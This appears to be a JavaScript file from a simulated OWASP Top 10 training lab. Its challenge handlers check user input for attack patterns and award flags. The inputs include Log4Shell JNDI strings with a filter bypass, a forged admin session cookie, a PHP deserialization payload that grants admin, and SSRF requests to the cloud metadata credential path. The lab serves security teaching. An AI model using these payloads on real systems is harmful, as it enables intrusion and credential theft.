    const out = document.getElementById('a06-out');
    if (/\$\{jndi:/i.test(ua)) {
      out.innerHTML = `<div class="resp err">JNDI resolve → RCE</div>`;
      capture('a06-log4shell');
    } else out.innerHTML = `<div class="resp info">logged ${esc(ua)}</div>`;
  }
  function a06Sbom() {
    const v = document.getElementById('a06s-cve').value.trim().toUpperCase();
    if (v === 'CVE-2021-44228') {
      document.getElementById('a06s-out').innerHTML = `<div class="resp ok">Correct</div>`;
      capture('a06-sbom-cve');
    } else document.getElementById('a06s-out').innerHTML = `<div class="resp err">Wrong CVE</div>`;
  }
  function a06Bypass() {
    const ua = document.getElementById('a06b-ua').value;
    const out = document.getElementById('a06b-out');
    if (/jndi/i.test(ua) && !/\$\{\$\{/.test(ua)) {
      out.innerHTML = `<div class="resp err">Blocked by filter: jndi</div>`;
      return;
    }
    if (/\$\{\$\{lower:j\}ndi:/i.test(ua) || /\$\{\$\{/.test(ua) && /ndi:/i.test(ua)) {
      out.innerHTML = `<div class="resp ok">Filter bypassed → RCE</div>`;
      capture('a06-jndi-bypass');
    } else out.innerHTML = `<div class="resp info">no lookup</div>`;
  }

  function a07Login() {
    const u = DB.users.find(x => x.username === document.getElementById('a07-user').value
      && x.password === document.getElementById('a07-pass').value);
    const out = document.getElementById('a07-out');
    if (!u) { out.innerHTML = `<div class="resp err">401</div>`; return; }
    const cookie = btoa('user_id=' + u.id);
    document.getElementById('a07-cookie').value = cookie;
    out.innerHTML = `<div class="resp ok">Set-Cookie: ${cookie}</div>`;
  }
  function a07Forge() {
    document.getElementById('a07-cookie').value = btoa('user_id=1');
  }
  function a07Me() {
    const out = document.getElementById('a07-out');
    try {
      const raw = document.getElementById('a07-cookie').value.trim();
      const m = atob(raw).match(/user_id=(\d+)/);
      if (!m) { out.innerHTML = `<div class="resp err">401 invalid cookie</div>`; return; }
      const u = DB.users.find(x => x.id === +m[1]);
      if (!u) { out.innerHTML = `<div class="resp err">401 user not found</div>`; return; }
      out.innerHTML = `<div class="resp ${u.role==='admin'?'ok':'info'}">${esc(JSON.stringify(u,null,2))}</div>`;
      if (u.role === 'admin') capture('a07-session-forge');
    } catch (e) {
      out.innerHTML = `<div class="resp err">${esc(e.message)}</div>`;
    }
  }
  function a07Stuff() {
    const u = document.getElementById('a07s-u').value;
    const p = document.getElementById('a07s-p').value;
    const out = document.getElementById('a07s-out');
    if (u === 'bob' && p === 'password') {
      out.innerHTML = `<div class="resp ok">200 bob (stuffing success)</div>`;
      capture('a07-stuffing');
    } else out.innerHTML = `<div class="resp err">401</div>`;
  }
  let mfaLogged = false;
  function a07MfaLogin() {
    const u = document.getElementById('a07m-u').value;
    const p = document.getElementById('a07m-p').value;
    const out = document.getElementById('a07m-out');
    if (u === 'alice' && p === 'alice') {
      mfaLogged = true;
      out.innerHTML = `<div class="resp warn">200 logged in — UI asks for MFA OTP…</div>`;
    } else { mfaLogged = false; out.innerHTML = `<div class="resp err">401</div>`; }
  }
  function a07MfaSensitive() {
    const out = document.getElementById('a07m-out');
    if (mfaLogged) {
      out.innerHTML += `<div class="resp ok mt8">GET /api/sensitive → 200 (MFA not enforced server-side)</div>`;
      capture('a07-no-mfa');
    } else out.innerHTML = `<div class="resp err">401 login first</div>`;
  }

  function a08Admin() {
    document.getElementById('a08-c').value =
      'O:4:"User":2:{s:4:"role";s:5:"admin";s:2:"id";i:2;}';
  }
  function a08Load() {
    const raw = document.getElementById('a08-c').value;
    const roleM = raw.match(/s:4:"role";s:\d+:"(\w+)"/);
    const role = roleM ? roleM[1] : 'user';
    const out = document.getElementById('a08-out');
    if (role === 'admin') {
      out.innerHTML = `<div class="resp ok">admin panel</div>`;
      capture('a08-deser-role');
    } else out.innerHTML = `<div class="resp info">role=${esc(role)}</div>`;
  }
  function a08IdLoad() {
    const raw = document.getElementById('a08i-c').value;
    const idM = raw.match(/s:2:"id";i:(\d+)/);
    const id = idM ? +idM[1] : 0;
    const out = document.getElementById('a08i-out');
    if (id === 1) {
      out.innerHTML = `<div class="resp ok">Mailbox admin@corp.local — private threads</div>`;
      capture('a08-deser-id');
    } else out.innerHTML = `<div class="resp info">Mailbox user id=${id}</div>`;
  }
  function a08Plugin() {
    const url = document.getElementById('a08p-url').value;
    const out = document.getElementById('a08p-out');
    if (/evil|plugin|\.zip/i.test(url)) {
      out.innerHTML = `<div class="resp ok">Installed unsigned plugin from ${esc(url)}</div>`;
      capture('a08-unsigned-update');
    } else out.innerHTML = `<div class="resp err">Need plugin URL</div>`;
  }

  function a09Ip() {
    const ip = document.getElementById('a09-ip').value.trim();
    const what = document.getElementById('a09-what').value.toLowerCase();
    const out = document.getElementById('a09-out');
    const ok = ip === '185.220.101.47' && (/brute|force|fail|export|attack|перебор|выгруз/.test(what));
    if (ok) {
      out.innerHTML = `<div class="resp ok">Detection confirmed</div>`;
      capture('a09-hunt-ip');
    } else out.innerHTML = `<div class="resp err">${L('Неверно','Wrong')}</div>`;
  }
  function a09Count() {
    const n = +document.getElementById('a09c-n').value;
    if (n === 47) {
      document.getElementById('a09c-out').innerHTML = `<div class="resp ok">Correct</div>`;
      capture('a09-count-fails');
    } else document.getElementById('a09c-out').innerHTML = `<div class="resp err">No</div>`;
  }
  function a09Table() {
    const t = document.getElementById('a09t-t').value.trim().toLowerCase();
    if (t === 'customers') {
      document.getElementById('a09t-out').innerHTML = `<div class="resp ok">Correct</div>`;
      capture('a09-exfil-table');
    } else document.getElementById('a09t-out').innerHTML = `<div class="resp err">No</div>`;
  }

  function a10Fetch() {
    const url = document.getElementById('a10-url').value.trim();
    const out = document.getElementById('a10-out');
    if (/169\.254\.169\.254.*security-credentials/i.test(url)) {
      out.innerHTML = `<div class="resp ok">{"AccessKeyId":"ASIA…","SecretAccessKey":"…"}</div>`;
      capture('a10-imds');
    } else if (/169\.254\.169\.254/.test(url)) {
      out.innerHTML = `<div class="resp info">ami-id\niam/\n…</div>`;
    } else out.innerHTML = `<div class="resp info">external page</div>`;
  }
  function a10Local() {
    const url = document.getElementById('a10l-url').value.trim();
    const out = document.getElementById('a10l-out');
    if (/127\.0\.0\.1|localhost/.test(url)) {
      out.innerHTML = `<div class="resp ok">{"panel":"internal-only","debug":true}</div>`;
      capture('a10-localhost');
    } else out.innerHTML = `<div class="resp info">ok</div>`;
  }
  function a10Fail() {
    const url = document.getElementById('a10f-url').value.trim();
    const out = document.getElementById('a10f-out');
    if (/bad\.invalid|:1/.test(url)) {
      out.innerHTML = `<div class="resp warn">HTTP 200 (fail-open!)\n{"data":null,"debug":"ECONNREFUSED\\nALLOW_ON_ERROR=true"}</div>`;
      capture('a10-fail-open');
    } else out.innerHTML = `<div class="resp info">ok</div>`;
  }

  return {
    render, selectChallenge, revealHint, capture, openSqlPractice, sqlPracticeBar,
    a01Fetch, a01EnumOne, a01EnumAll, a01Promote,
    a02None, a02VerifyNone, a02WeakSign, a02dAdmin, a02dVerify,
    a03Login, a03Xss, a03Union,
    a04Check, a04Brute, a04SecQ, a04Biz,
    a05Crash, a05Headers, a05CorsSubmit, a05Default,
    a06Payload, a06Send, a06Sbom, a06Bypass,
    a07Login, a07Forge, a07Me, a07Stuff, a07MfaLogin, a07MfaSensitive,
    a08Admin, a08Load, a08IdLoad, a08Plugin,
    a09Ip, a09Count, a09Table,
    a10Fetch, a10Local, a10Fail,
  };
})();
